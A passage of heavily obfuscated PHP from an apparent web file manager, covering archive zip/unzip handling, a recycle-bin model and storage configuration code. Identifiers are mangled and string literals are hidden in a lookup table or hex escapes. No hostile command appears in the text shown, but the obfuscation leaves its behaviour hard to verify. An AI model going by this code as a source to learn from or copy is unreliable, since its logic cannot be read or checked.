¦ùÉ = $”Ø ºû[$¦¯À½œ[32]] . $¦¯À½œ[10] . $…’ë¥Ä¤; } if ($·ÃÛìáÒ) { $ÊêˆÇ¿¢ = $·ÃÛìáÒ; } } if ($ßÒ»·° ->getType() == $¦¯À½œ[119]) { $à¤ƒç¦¶ = self::init($ÊêˆÇ¿¢); $§ Ş²ª© = $à¤ƒç¦¶->getType() == $¦¯À½œ[119] ? $ÊêˆÇ¿¢ : get_path_father($ßÒ»·° ->path); $§ Ş²ª© = rtrim($§ Ş²ª©, $¦¯À½œ[8]) . $¦¯À½œ[8]; mk_dir($§ Ş²ª©); } else { $ƒ¼¼Ë = TEMP_FILES . $¦¯À½œ[1270] . time() . rand_string(8) . $¦¯À½œ[8]; mk_dir($ƒ¼¼Ë); file_put_contents($ƒ¼¼Ë . $¦¯À½œ[1271], $¦¯À½œ[12]); $§ Ş²ª© = $ƒ¼¼Ë; } $îŞ‡·Ò = IO::info($§ Ş²ª©); if (!$îŞ‡·Ò || !$îŞ‡·Ò[$¦¯À½œ[245]]) { show_json(LNG($¦¯À½œ[1272]), !1); } $¹ÁàìùŠ = self::zipFileList($‹È¦ú‰®, $ƒ¼¼Ë); foreach ($¹ÁàìùŠ as $êü‰£˜ä => $ŒçŠüŸö) { $¹ÁàìùŠ[$êü‰£˜ä] = self::iconvSystem($ŒçŠüŸö); } $Äìµèô = get_filename_auto($§ Ş²ª© . $ÔŒ ¦ùÉ, $¦¯À½œ[12], $õ™ëìâÄ); KodArchive::create(self::iconvSystem($Äìµèô), $¹ÁàìùŠ); if (!IO::exist($Äìµèô)) { if ($ƒ¼¼Ë) { del_dir($ƒ¼¼Ë); } write_log($¦¯À½œ[1273] . $Äìµèô, $¦¯À½œ[400]); show_json(LNG($¦¯À½œ[1274]), !1); } if (!$ƒ¼¼Ë) { return $Äìµèô; } $çĞ™Öï = self::move($Äìµèô, $ÊêˆÇ¿¢, $õ™ëìâÄ); if ($ƒ¼¼Ë) { del_dir($ƒ¼¼Ë); } if (!$Äìµèô) { write_log($¦¯À½œ[1275] . $Äìµèô . $¦¯À½œ[1276] . $ÊêˆÇ¿¢, $¦¯À½œ[400]); show_json(LNG($¦¯À½œ[1274]), !1); } return $çĞ™Öï; } public static function unzip($­Êç„†é, $ç‡˜Ó«, $Æ£‰ûã = "\55\x31", $ëÁÓ„»º = "\x72\145\x70\154\141\x63\145") { $¬¶…ßø½ =& $_SERVER[¼èá¯æÙ]; $‘Ç¡úÚ = parent::info($­Êç„†é); if (!$‘Ç¡úÚ) { show_json(LNG($¬¶…ßø½[1277]), !1); } $İÑş˜ì = IO::infoFullSimple($ç‡˜Ó«); if (!$İÑş˜ì) { $ç‡˜Ó« = IO::mkdir($ç‡˜Ó«); } if (isset($İÑş˜ì[$¬¶…ßø½[203]]) && trim($İÑş˜ì[$¬¶…ßø½[97]], $¬¶…ßø½[8]) != trim($ç‡˜Ó«, $¬¶…ßø½[8])) { $€öæ¹ó‹ = KodIO::make($İÑş˜ì[$¬¶…ßø½[202]]); $ä¡½»Šø = IO::fileNameAuto($€öæ¹ó‹, $İÑş˜ì[$¬¶…ßø½[32]], REPEAT_RENAME_FOLDER, !0); $ç‡˜Ó« = IO::mkdir($€öæ¹ó‹ . $ä¡½»Šø); } $Æ£‰ûã = $Æ£‰ûã && $Æ£‰ûã != $¬¶…ßø½[1278] ? @json_decode($Æ£‰ûã, !0) : -1; $´š²àş¸ = self::unzipPart($­Êç„†é, $Æ£‰ûã); if (!$´š²àş¸ || !IO::exist($´š²àş¸[$¬¶…ßø½[242]])) { show_json(LNG($¬¶…ßø½[118]), !1); } $È±Â¸·Ç = $´š²àş¸[$¬¶…ßø½[1279]][count($´š²àş¸[$¬¶…ßø½[1279]]) - 1]; if ($È±Â¸·Ç[$¬¶…ßø½[1280]] == -1 || substr($È±Â¸·Ç[$¬¶…ßø½[32]], -1, 1) == $¬¶…ßø½[8]) { $ŒÆ ¼ì¿ = $´š²àş¸[$¬¶…ßø½[1281]] . rand_string(10) . $¬¶…ßø½[8]; mk_dir($ŒÆ ¼ì¿); $À†Èø³¨ = count($´š²àş¸[$¬¶…ßø½[1279]]) == 1 ? IO::ext($­Êç„†é) : get_path_ext($´š²àş¸[$¬¶…ßø½[242]]); $À½”æşñ = KodArchive::extract(self::iconvSystem($´š²àş¸[$¬¶…ßø½[242]]), $ŒÆ ¼ì¿, $È±Â¸·Ç[$¬¶…ßø½[1280]], $ä¡½»Šø, $À†Èø³¨); self::unzipErrorCheck($À½”æşñ, array($¬¶…ßø½[1282], $­Êç„†é, $À†Èø³¨, $ç‡˜Ó«, $´š²àş¸)); Hook::trigger($¬¶…ßø½[1283], $ŒÆ ¼ì¿); recursion_dir($ŒÆ ¼ì¿, $¿Èì‹æ, $¯»Çä°, 0); $ĞĞ¥šŞ = array_merge($¿Èì‹æ, $¯»Çä°); $ÉòÎ‡ßå = array(); foreach ($ĞĞ¥šŞ as $ßË€ÀÇè) { $’úìÆ×³ = IO::move(self::iconvApp($ßË€ÀÇè), $ç‡˜Ó«, $ëÁÓ„»º); if ($’úìÆ×³) { $ÉòÎ‡ßå[] = $’úìÆ×³; } } del_dir($ŒÆ ¼ì¿); } else { $’úìÆ×³ = IO::move($´š²àş¸[$¬¶…ßø½[242]], $ç‡˜Ó«, $ëÁÓ„»º, get_path_this($È±Â¸·Ç[$¬¶…ßø½[32]])); if ($’úìÆ×³) { $ÉòÎ‡ßå[] = $’úìÆ×³; } } return $ÉòÎ‡ßå ? $ÉòÎ‡ßå : !1; } public static function unzipList($Í‰ã¾Ú) { $ñ£§¡ı„ =& $_SERVER[¼èá¯æÙ]; $·§×Ö±é = isset($Í‰ã¾Ú[$ñ£§¡ı„[1284]]) ? $Í‰ã¾Ú[$ñ£§¡ı„[1284]] : !1; $¦Ï€Ë‹ş = isset($Í‰ã¾Ú[$ñ£§¡ı„[1280]]) ? @json_decode($Í‰ã¾Ú[$ñ£§¡ı„[1280]], !0) : -1; $ö¿ãÅÑÙ = self::unzipPart($Í‰ã¾Ú[$ñ£§¡ı„[97]], $¦Ï€Ë‹ş); if (!$ö¿ãÅÑÙ || !IO::exist($ö¿ãÅÑÙ[$ñ£§¡ı„[242]])) { show_json(LNG($ñ£§¡ı„[118]), !1); } $Ïù¬ßÏ¾ = $ö¿ãÅÑÙ[$ñ£§¡ı„[1279]][count($ö¿ãÅÑÙ[$ñ£§¡ı„[1279]]) - 1]; $ëƒãŠ­ç = in_array(IO::ext($ö¿ãÅÑÙ[$ñ£§¡ı„[242]]), array($ñ£§¡ı„[400], $ñ£§¡ı„[1285], $ñ£§¡ı„[1286], $ñ£§¡ı„[1287], $ñ£§¡ı„[1288], $ñ£§¡ı„[1289])); if (!$·§×Ö±é && ($Ïù¬ßÏ¾[$ñ£§¡ı„[1280]] == -1 || $ëƒãŠ­ç)) { $üüÕ³ğ = $ö¿ãÅÑÙ[$ñ£§¡ı„[1281]] . get_path_this($ö¿ãÅÑÙ[$ñ£§¡ı„[242]]) . $ñ£§¡ı„[1290]; if (!IO::exist($üüÕ³ğ)) { $úø™±‘Ï = $Ïù¬ßÏ¾[$ñ£§¡ı„[1280]] == -1 ? get_path_ext(IO::pathThis($Í‰ã¾Ú[$ñ£§¡ı„[97]])) : get_path_ext($ö¿ãÅÑÙ[$ñ£§¡ı„[242]]); $Ñ¾ñà¬ = KodArchive::listContent(self::iconvSystem($ö¿ãÅÑÙ[$ñ£§¡ı„[242]]), !0, $úø™±‘Ï); self::unzipErrorCheck($Ñ¾ñà¬, array($ñ£§¡ı„[1291], $Í‰ã¾Ú, $ö¿ãÅÑÙ)); @file_put_contents($üüÕ³ğ, json_encode($Ñ¾ñà¬[$ñ£§¡ı„[1292]])); } return @json_decode(IO::getContent($üüÕ³ğ), !0); } IO::fileOut($ö¿ãÅÑÙ[$ñ£§¡ı„[242]], $·§×Ö±é, get_path_this($Ïù¬ßÏ¾[$ñ£§¡ı„[32]])); die; } private static function zipFileList($È— ®‚å, $Á‡°ÉÒ = false) { $ÆÇı–¿ =& $_SERVER[¼èá¯æÙ]; $ıÍ™ˆ¯ = array(); foreach ($È— ®‚å as $Èõ‘Àä«) { $è„Ì‰ÍÛ = $Èõ‘Àä«[$ÆÇı–¿[97]]; if ($Á‡°ÉÒ) { $è„Ì‰ÍÛ = self::copy($Èõ‘Àä«[$ÆÇı–¿[97]], $Á‡°ÉÒ, $ÆÇı–¿[901]); } else { $Ğ×ªíĞ = self::init($Èõ‘Àä«[$ÆÇı–¿[97]]); if ($Ğ×ªíĞ->getType() == $ÆÇı–¿[119]) { $è„Ì‰ÍÛ = $Ğ×ªíĞ->path; } } if ($è„Ì‰ÍÛ && self::local()->exist($è„Ì‰ÍÛ)) { $ıÍ™ˆ¯[$Èõ‘Àä«[$ÆÇı–¿[97]]] = $è„Ì‰ÍÛ; } } if (!empty($ıÍ™ˆ¯)) { return array_values($ıÍ™ˆ¯); } show_json(LNG($ÆÇı–¿[1251]), !1); } private static function localFilePath($ŸŞ‘™Æ·) { $’ÚóÛæÄ =& $_SERVER[¼èá¯æÙ]; $¾øâàÍ = KodIO::parse($ŸŞ‘™Æ·); if ($¾øâàÍ[$’ÚóÛæÄ[33]] == KodIO::KOD_SOURCE) { $­´œÏú = Model($’ÚóÛæÄ[907])->fileInfoGet(KodIO::sourceID($ŸŞ‘™Æ·)); if (!$­´œÏú[$’ÚóÛæÄ[97]]) { show_json($’ÚóÛæÄ[1293], !1); } $ŸŞ‘™Æ· = $­´œÏú[$’ÚóÛæÄ[97]]; } $ßÔšºøï = self::init($ŸŞ‘™Æ·); if ($ßÔšºøï->pathParse[$’ÚóÛæÄ[1237]]) { $ŸŞ‘™Æ· = $ßÔšºøï->pathParse[$’ÚóÛæÄ[1237]]; $ßÔšºøï = self::init($ŸŞ‘™Æ·); } $¤’ÇÆÍ = $ßÔšºøï->getType(); if ($¤’ÇÆÍ == $’ÚóÛæÄ[119] || $¤’ÇÆÍ == $’ÚóÛæÄ[1294]) { if (!$ßÔšºøï->exist($ßÔšºøï->path)) { show_json(LNG($’ÚóÛæÄ[118]), !1); } return $ßÔšºøï->path; } return !1; } public static function unzipPart($Ùã•Î³ë, $ú¥Â·¨ğ = -1) { $å•ñè =& $_SERVER[¼èá¯æÙ]; $¤ş­Ëîş = IO::pathThis($Ùã•Î³ë); if (!$ú¥Â·¨ğ || $ú¥Â·¨ğ == -1) { $±«Ê»¿” = array(array($å•ñè[32] => $¤ş­Ëîş, $å•ñè[1280] => -1)); $±«Ê»¿”[0][$å•ñè[1295]] = $±«Ê»¿”[0][$å•ñè[32]]; } else { if (is_array($ú¥Â·¨ğ)) { $±«Ê»¿” = $ú¥Â·¨ğ; $à°Û±• = count($±«Ê»¿”) - 1; for ($ƒÀ ›ùå = 0; $ƒÀ ›ùå <= $à°Û±•; $ƒÀ ›ùå++) { $¿ª‡¥ = $±«Ê»¿”[$ƒÀ ›ùå]; $¬Ñ µ‘ = get_path_this($¿ª‡¥[$å•ñè[32]]) . (checkExtSafe($¿ª‡¥[$å•ñè[32]]) ? $å•ñè[12] : $å•ñè[1296]); $±«Ê»¿”[$ƒÀ ›ùå][$å•ñè[1295]] = $å•ñè[1297] . intval($¿ª‡¥[$å•ñè[1280]]) . $å•ñè[473] . $¬Ñ µ‘; if ($ƒÀ ›ùå == 0) { continue; } $±«Ê»¿”[$ƒÀ ›ùå][$å•ñè[1295]] = $±«Ê»¿”[$ƒÀ ›ùå - 1][$å•ñè[1295]] . $å•ñè[1298] . $±«Ê»¿”[$ƒÀ ›ùå][$å•ñè[1295]]; } } } if (!is_array($±«Ê»¿”) || count($±«Ê»¿”) == 0) { return !1; } $Õ÷è½Ğ• = $±«Ê»¿”[count($±«Ê»¿”) - 1]; if (!IO::exist($Ùã•Î³ë)) { return !1; } $ÁÁÃÖÒ… = TEMP_FILES . $å•ñè[1299] . kodIO::hashPathSafe($Ùã•Î³ë) . $å•ñè[8]; $Ôòª€õ  = $ÁÁÃÖÒ… . $Õ÷è½Ğ•[$å•ñè[1295]]; mk_dir($ÁÁÃÖÒ…); file_put_contents(TEMP_FILES . $å•ñè[1271], $å•ñè[12]); if (IO::exist($Ôòª€õ )) { return array($å•ñè[242] => $Ôòª€õ , $å•ñè[1279] => $±«Ê»¿”, $å•ñè[1281] => $ÁÁÃÖÒ…); } $‰æˆ†Â£ = self::localFilePath($Ùã•Î³ë); if (!$‰æˆ†Â£) { $‰æˆ†Â£ = $ÁÁÃÖÒ… . $å•ñè[1300]; if (!IO::exist($‰æˆ†Â£)) { self::copy($Ùã•Î³ë, $ÁÁÃÖÒ…, !1, get_path_this($‰æˆ†Â£)); } } if (!$‰æˆ†Â£ || !IO::exist($‰æˆ†Â£)) { return !1; } if ($Õ÷è½Ğ•[$å•ñè[1280]] == -1) { return array($å•ñè[242] => $‰æˆ†Â£, $å•ñè[1279] => $±«Ê»¿”, $å•ñè[1281] => $ÁÁÃÖÒ…); } $¹»ü­°° = $‰æˆ†Â£; foreach ($±«Ê»¿” as $ƒÀ ›ùå => $¿ª‡¥) { if (!$¿ª‡¥ || $¿ª‡¥[$å•ñè[1280]] == $å•ñè[1278]) { break; } if (substr($¿ª‡¥[$å•ñè[32]], -1, 1) == $å•ñè[8]) { break; } $ñ´‰ì = in_array(get_path_ext($¿ª‡¥[$å•ñè[1295]]), array($å•ñè[400], $å•ñè[1285], $å•ñè[1286], $å•ñè[1287], $å•ñè[1288], $å•ñè[1289])); $½áÑ°¬ = $ƒÀ ›ùå == count($±«Ê»¿”) - 1 && $ñ´‰ì; $ÖéÒ„â× = $ÁÁÃÖÒ… . $¿ª‡¥[$å•ñè[1295]]; $û¡÷üõ® = $ÁÁÃÖÒ… . get_path_this($¿ª‡¥[$å•ñè[32]]); if (IO::exist($ÖéÒ„â×)) { $¹»ü­°° = $ÖéÒ„â×; continue; } $ÎşÏôº€ = $ƒÀ ›ùå == 0 ? get_path_ext($¤ş­Ëîş) : get_path_ext($¹»ü­°°); $ÃÒçŠ¹ = KodArchive::extract(self::iconvSystem($¹»ü­°°), $ÁÁÃÖÒ…, $¿ª‡¥[$å•ñè[1280]], $½ñü‘ßÛ, $ÎşÏôº€); self::unzipErrorCheck($ÃÒçŠ¹, array($å•ñè[1301], $Ùã•Î³ë, $±«Ê»¿”, $¿ª‡¥, $ÖéÒ„â×)); if (IO::exist($û¡÷üõ®)) { IO::rename($û¡÷üõ®, get_path_this($ÖéÒ„â×)); } $¹»ü­°° = $ÖéÒ„â×; } $Ôòª€õ  = $¹»ü­°°; return array($å•ñè[242] => $¹»ü­°°, $å•ñè[1279] => $±«Ê»¿”, $å•ñè[1281] => $ÁÁÃÖÒ…); } private static function unzipErrorCheck($ÇÉÑäá, $¦Œ¯™ó£ = false) { $”Ñ†àÅë =& $_SERVER[¼èá¯æÙ]; if ($ÇÉÑäá[$”Ñ†àÅë[1302]]) { return !0; } write_log(array($”Ñ†àÅë[1303], $ÇÉÑäá, $¦Œ¯™ó£), $”Ñ†àÅë[1304]); show_json($”Ñ†àÅë[1305] . json_encode($ÇÉÑäá[$”Ñ†àÅë[1292]]), !1); die; } } goto añƒ÷ï£æó; b¹ö‰£Ì…Å: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\162\143\x65\x5f\x72\145\x63\x79\x63\x6c\145"; protected $dataAuto = array(array("\143\x72\145\x61\164\x65\124\x69\x6d\145", "\x74\x69\155\145", "\x69\156\163\145\x72\x74", "\146\165\156\x63\x74\x69\157\156")); public function listData($¡¥Öè« = false) { $öÍ¼³Ú… =& $_SERVER[¼èá¯æÙ]; $¡¥Öè« = $¡¥Öè« ? $¡¥Öè« : USER_ID; $ìáÔ° = $this->where(array($öÍ¼³Ú…[1769] => $¡¥Öè«))->select(); return array_to_keyvalue($ìáÔ°, $öÍ¼³Ú…[12], $öÍ¼³Ú…[203]); } public function moveToRecycle($×½»Œ¯İ) { $‰Û’Ö¦ =& $_SERVER[¼èá¯æÙ]; $â¯‰õÆ· = Model($‰Û’Ö¦[1426]); $Î¤†äè÷ = $â¯‰õÆ·->sourceInfo($×½»Œ¯İ); if (!$Î¤†äè÷ || $Î¤†äè÷[$‰Û’Ö¦[516]] == $‰Û’Ö¦[101]) { return; } $¥èº÷‘… = array($‰Û’Ö¦[502] => $×½»Œ¯İ, $‰Û’Ö¦[1769] => USER_ID, $‰Û’Ö¦[662] => $Î¤†äè÷[$‰Û’Ö¦[200]], $‰Û’Ö¦[663] => $Î¤†äè÷[$‰Û’Ö¦[580]], $‰Û’Ö¦[666] => $Î¤†äè÷[$‰Û’Ö¦[595]]); $this->add($¥èº÷‘…); $this->recycleMove($×½»Œ¯İ, 1); if ($Î¤†äè÷[$‰Û’Ö¦[496]] == $‰Û’Ö¦[101]) { $Óú×™±å = array($‰Û’Ö¦[666] => array($‰Û’Ö¦[626], $Î¤†äè÷[$‰Û’Ö¦[595]] . $×½»Œ¯İ . $‰Û’Ö¦[627])); $â¯‰õÆ·->where($Óú×™±å)->setField($‰Û’Ö¦[516], 1); } } public function clear() { $this->remove(!1); } public function remove($óÁé¶š = false, $ü¸é§‹› = false) { $ˆŞùŒ¤ =& $_SERVER[¼èá¯æÙ]; $ü¸é§‹› = $ü¸é§‹› ? $ü¸é§‹› : USER_ID; $ˆ£¡ñÁ” = Model($ˆŞùŒ¤[1426]); $ê¯ôÀ‚Ş = $this->listData($ü¸é§‹›); $óÁé¶š = $óÁé¶š === !1 ? !1 : $óÁé¶š; $„»¼Òëô = array(); foreach ($ê¯ôÀ‚Ş as $Ü÷«¾—) { if ($óÁé¶š != !1 && !in_array($Ü÷«¾—, $óÁé¶š)) { continue; } $«¢­¹¸Â = $ˆ£¡ñÁ”->sourceInfo($Ü÷«¾—); $ˆ£¡ñÁ”->remove($Ü÷«¾—, !1); $à·ä¾Óü = $«¢­¹¸Â[$ˆŞùŒ¤[200]] . $ˆŞùŒ¤[11] . $«¢­¹¸Â[$ˆŞùŒ¤[580]]; $„»¼Òëô[$à·ä¾Óü] = array($ˆŞùŒ¤[662] => $«¢­¹¸Â[$ˆŞùŒ¤[200]], $ˆŞùŒ¤[580] => $«¢­¹¸Â[$ˆŞùŒ¤[580]]); $this->where(array($ˆŞùŒ¤[203] => $Ü÷«¾—))->delete(); } foreach ($„»¼Òëô as $êì¶”çˆ) { $ˆ£¡ñÁ”->targetSpaceUpdate($êì¶”çˆ[$ˆŞùŒ¤[200]], $êì¶”çˆ[$ˆŞùŒ¤[580]]); } } public function restore($ÀßÏ‚Ù = false) { $ŞÉ†øÁ = $this->listData(); $this->_restoreSource($ŞÉ†øÁ, $ÀßÏ‚Ù); } public function removeUserAll($‹§¬ÀŞ”) { $this->remove(!1, $‹§¬ÀŞ”); } public function restoreItem($äïìî‚º) { $this->_restoreSource(array($äïìî‚º), array($äïìî‚º)); } private function _restoreSource($»¶‰õş, $ÅÛ¼Üáş) { $¡›ö¿â =& $_SERVER[¼èá¯æÙ]; $±…ª’”ˆ = Model($¡›ö¿â[1426]); $ÅÛ¼Üáş = $ÅÛ¼Üáş == !1 ? !1 : $ÅÛ¼Üáş; if (!$»¶‰õş) { return !0; } $ÍàîàôÈ = array(); foreach ($»¶‰õş as $äµ—ÅĞ‚) { if ($ÅÛ¼Üáş != !1 && !in_array($äµ—ÅĞ‚, $ÅÛ¼Üáş)) { continue; } $‰Ø¶•ñ® = $±…ª’”ˆ->sourceInfo($äµ—ÅĞ‚); $‹ÔÈ¦†« = $±…ª’”ˆ->sourceInfo($‰Ø¶•ñ®[$¡›ö¿â[202]]); if ($‹ÔÈ¦†«[$¡›ö¿â[516]] == $¡›ö¿â[101]) { continue; } $±…ª’”ˆ->lockMoveStart($äµ—ÅĞ‚); $this->recycleMove($äµ—ÅĞ‚, 0); if ($‰Ø¶•ñ®[$¡›ö¿â[496]] == $¡›ö¿â[101]) { $Ûá°Éèß = array($¡›ö¿â[666] => array($¡›ö¿â[626], $‰Ø¶•ñ®[$¡›ö¿â[595]] . $äµ—ÅĞ‚ . $¡›ö¿â[627])); $±…ª’”ˆ->where($Ûá°Éèß)->setField($¡›ö¿â[516], 0); $this->restoreFolderChildren($äµ—ÅĞ‚, $»¶‰õş); } $this->where(array($¡›ö¿â[203] => $äµ—ÅĞ‚))->delete(); $±…ª’”ˆ->folderSizeReset($‰Ø¶•ñ®[$¡›ö¿â[202]]); $ÍàîàôÈ[] = $‰Ø¶•ñ®[$¡›ö¿â[202]]; if ($‰Ø¶•ñ®[$¡›ö¿â[496]] == $¡›ö¿â[101]) { $ÍàîàôÈ[] = $äµ—ÅĞ‚; } $±…ª’”ˆ->lockMoveEnd($äµ—ÅĞ‚); } $±…ª’”ˆ->updateModifyTime($ÍàîàôÈ); } private function restoreFolderChildren($Ê‰Ùô–„, $şÕ”Ôß¬) { $‚Æéı´® =& $_SERVER[¼èá¯æÙ]; $·İŞ¬‰ = Model($‚Æéı´®[1426]); $‰ë ¶¿ = array($‚Æéı´®[203] => array($‚Æéı´®[7], array())); foreach ($şÕ”Ôß¬ as $ÍŠÄ“å¼) { if ($ÍŠÄ“å¼ == $Ê‰Ùô–„) { continue; } if (!$·İŞ¬‰->isParentOf($Ê‰Ùô–„, $ÍŠÄ“å¼)) { continue; } $’ÑĞ˜ÓŞ = $·İŞ¬‰->sourceInfo($ÍŠÄ“å¼); if ($’ÑĞ˜ÓŞ[$‚Æéı´®[496]] == $‚Æéı´®[101]) { $‰ë ¶¿[] = array($‚Æéı´®[666] => array($‚Æéı´®[626], $’ÑĞ˜ÓŞ[$‚Æéı´®[595]] . $ÍŠÄ“å¼ . $‚Æéı´®[627])); } else { $‰ë ¶¿[$‚Æéı´®[203]][1][] = $ÍŠÄ“å¼; } } if (!$‰ë ¶¿[$‚Æéı´®[203]][1]) { unset($‰ë ¶¿[$‚Æéı´®[203]]); } if (!$‰ë ¶¿) { return; } if (is_array($‰ë ¶¿[$‚Æéı´®[203]]) && is_array($‰ë ¶¿[$‚Æéı´®[203]][1])) { $‰ë ¶¿[$‚Æéı´®[203]][1] = array_unique($‰ë ¶¿[$‚Æéı´®[203]][1]); } $‰ë ¶¿[$‚Æéı´®[1082]] = $‚Æéı´®[2081]; $·İŞ¬‰->where($‰ë ¶¿)->setField($‚Æéı´®[516], 1); } private function recycleMove($¢Û´ö¢ı, $öÇÏãßØ = 1) { $õòµã„ë =& $_SERVER[¼èá¯æÙ]; $Ù¶ÌĞ‘î = Model($õòµã„ë[1426]); $ˆÆ“àğ… = Model($õòµã„ë[2312]); $ùÃÓ˜ü = array($õòµã„ë[203] => $¢Û´ö¢ı); if ($öÇÏãßØ) { $Ù¶ÌĞ‘î->where($ùÃÓ˜ü)->setField($õòµã„ë[516], 1); $ˆÆ“àğ…->eventRecycle($¢Û´ö¢ı, $õòµã„ë[2313]); } else { $¤ãéşºØ = $Ù¶ÌĞ‘î->where($ùÃÓ˜ü)->find(); $ú£Èå‘­ = $¤ãéşºØ[$õòµã„ë[496]] == $õòµã„ë[101]; $•™ğ¸…À = $Ù¶ÌĞ‘î->fileNameAuto($¤ãéşºØ[$õòµã„ë[202]], $¤ãéşºØ[$õòµã„ë[32]], REPEAT_RENAME_FOLDER, $ú£Èå‘­); if ($•™ğ¸…À != $¤ãéşºØ[$õòµã„ë[32]]) { $Ù¶ÌĞ‘î->rename($¢Û´ö¢ı, $•™ğ¸…À); } $Ù¶ÌĞ‘î->where($ùÃÓ˜ü)->setField($õòµã„ë[516], 0); $ˆÆ“àğ…->eventRecycle($¢Û´ö¢ı, $õòµã„ë[2314]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\56\x73\157\x75\x72\143\x65\x53\x65\x63\x72\145\164\x4c\x69\x73\164"; public $field = array("\x73\157\165\162\x63\145\x49\104", "\x74\171\x70\145\x49\104", "\x63\x72\145\141\164\145\125\x73\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\56\163\x74\157\162\x61\x67\x65\114\151\163\164"; public $field = array("\x6e\141\x6d\145", "\x73\x69\x7a\145\115\x61\170", "\x73\x79\163\x74\145\x6d", "\x64\x65\146\x61\165\x6c\x74", "\x64\162\151\166\x65\x72", "\143\x6f\x6e\x66\x69\x67"); public function listData($ÈÄª„úÇ = false, $ü‹éÖ¦ = "\155\157\144\151\x66\171\124\151\155\145", $à‹Òãç” = false) { $ÍĞˆüÌ„ =& $_SERVER[¼èá¯æÙ]; $îèı‡ = parent::listData($ÈÄª„úÇ, $ü‹éÖ¦, $à‹Òãç”); if ($ÈÄª„úÇ) { return $îèı‡; } $‹î±°“‚ = array(); if ($GLOBALS[$ÍĞˆüÌ„[2315]]) { $‹î±°“‚ = $this->ioSizeUseGet(array_to_keyvalue($îèı‡, $ÍĞˆüÌ„[12], $ÍĞˆüÌ„[486])); } foreach ($îèı‡ as $Âñ´ôœ½ => $àÄ×ÏÔì) { unset($îèı‡[$Âñ´ôœ½][$ÍĞˆüÌ„[6]]); $îèı‡[$Âñ´ôœ½][$ÍĞˆüÌ„[1967]] = isset($‹î±°“‚[$àÄ×ÏÔì[$ÍĞˆüÌ„[486]]]) ? $‹î±°“‚[$àÄ×ÏÔì[$ÍĞˆüÌ„[486]]] : 0; } return $îèı‡; } public function ioSizeUseGet($ËñÎÖ‰) { $˜ÇÄûï‡ =& $_SERVER[¼èá¯æÙ]; if (!$ËñÎÖ‰) { return array(); } $‚¯Æ°¦€ = $˜ÇÄûï‡[2316] . implode($˜ÇÄûï‡[50], $ËñÎÖ‰); $º¦œ«­Ä = Cache::get($‚¯Æ°¦€); if ($º¦œ«­Ä) { return $º¦œ«­Ä; } $°œ´¨Ã = array($˜ÇÄûï‡[900] => $˜ÇÄûï‡[486], $˜ÇÄûï‡[2317] => $˜ÇÄûï‡[89]); $ƒ³©àÜ´ = array($˜ÇÄûï‡[900] => array($˜ÇÄûï‡[7], $ËñÎÖ‰)); $º¦œ«­Ä = Model($˜ÇÄûï‡[872])->field($°œ´¨Ã)->where($ƒ³©àÜ´)->group($˜ÇÄûï‡[900])->select(); $º¦œ«­Ä = array_to_keyvalue($º¦œ«­Ä, $˜ÇÄûï‡[486], $˜ÇÄûï‡[89]); Cache::set($‚¯Æ°¦€, $º¦œ«­Ä, 600); return $º¦œ«­Ä; } public function getConfig($µ›öÌòÙ) { $Æş Å²´ = parent::listData($µ›öÌòÙ); $‚Ò…“¶ = _get($Æş Å²´, $_SERVER[¼èá¯æÙ][6], array()); if ($‚Ò…“¶ && !is_array($‚Ò…“¶)) { $‚Ò…“¶ = json_decode($‚Ò…“¶, !0); } return $‚Ò…“¶; } public function update($ã”éö²Ë, $ˆ‹²á¡) { $úÇ¬—ùÓ =& $_SERVER[¼èá¯æÙ]; $´Ÿ—‡’± = $ˆ‹²á¡[$úÇ¬—ùÓ[32]]; $É³°³¦â = array_to_keyvalue(parent::listData(), $úÇ¬—ùÓ[32]); if (isset($É³°³¦â[$´Ÿ—‡’±]) && $É³°³¦â[$´Ÿ—‡’±][$úÇ¬—ùÓ[486]] != $ã”éö²Ë) { return !1; } $this->checkPwd($ã”éö²Ë, $ˆ‹²á¡); if (isset($ˆ‹²á¡[$úÇ¬—ùÓ[2318]]) && $ˆ‹²á¡[$úÇ¬—ùÓ[2318]] == $úÇ¬—ùÓ[101]) { $this->checkConfig($ˆ‹²á¡); } unset($ˆ‹²á¡[$úÇ¬—ùÓ[2318]]); $¡ú¹ ‹ = parent::update($ã”éö²Ë, $ˆ‹²á¡); if ($¡ú¹ ‹ && $ˆ‹²á¡[$úÇ¬—ùÓ[37]]) { $Â¨Ãİ®» = 0; foreach ($É³°³¦â as $²”ŸİØæ) { if ($²”ŸİØæ[$úÇ¬—ùÓ[37]] && $²”ŸİØæ[$úÇ¬—ùÓ[486]] != $ã”éö²Ë) { $Â¨Ãİ®» = $²”ŸİØæ[$úÇ¬—ùÓ[486]]; parent::update($²”ŸİØæ[$úÇ¬—ùÓ[486]], array($úÇ¬—ùÓ[37] => 0)); } } $this->updateBackup($ã”éö²Ë, $Â¨Ãİ®»); } return $¡ú¹ ‹; } public function add($ÊÌ§øòä) { $³øİÙÜ =& $_SERVER[¼èá¯æÙ]; $İåêÂÜ‚ = array_to_keyvalue(parent::listData(), $³øİÙÜ[32]); if (isset($İåêÂÜ‚[$ÊÌ§øòä[$³øİÙÜ[32]]])) { return !1; } $this->checkConfig($ÊÌ§øòä); $êÔÇÇö = parent::insert($ÊÌ§øòä); if ($êÔÇÇö && $ÊÌ§øòä[$³øİÙÜ[37]]) { foreach ($İåêÂÜ‚ as $Å‘ú„‘Å) { if ($Å‘ú„‘Å[$³øİÙÜ[37]]) { parent::update($Å‘ú„‘Å[$³øİÙÜ[486]], array($³øİÙÜ[37] => 0)); } } } return $êÔÇÇö; } public function updateBackup($ìÄÌªÁ , $³ŒÎäí) { $èÎ­±óò =& $_SERVER[¼èá¯æÙ]; if (!$³ŒÎäí) { return; } $ü‡«Üûâ = Model($èÎ­±óò[830])->config(); if ($ü‡«Üûâ[$èÎ­±óò[1747]] != $èÎ­±óò[101] || $ü‡«Üûâ[$èÎ­±óò[834]] != $³ŒÎäí) { return; } $Ï¶»‘¸ = Model($èÎ­±óò[852])->get($èÎ­±óò[866]); $Ï¶»‘¸ = json_decode($Ï¶»‘¸, !0); if (!$Ï¶»‘¸) { return; } $Ï¶»‘¸[$èÎ­±óò[834]] = $ìÄÌªÁ ; Model($èÎ­±óò[852])->set(array($èÎ­±óò[866] => $Ï¶»‘¸)); } public function checkPwd($òæÁˆ…, &$»–î•½) { $Şé™èß£ =& $_SERVER[¼èá¯æÙ]; if 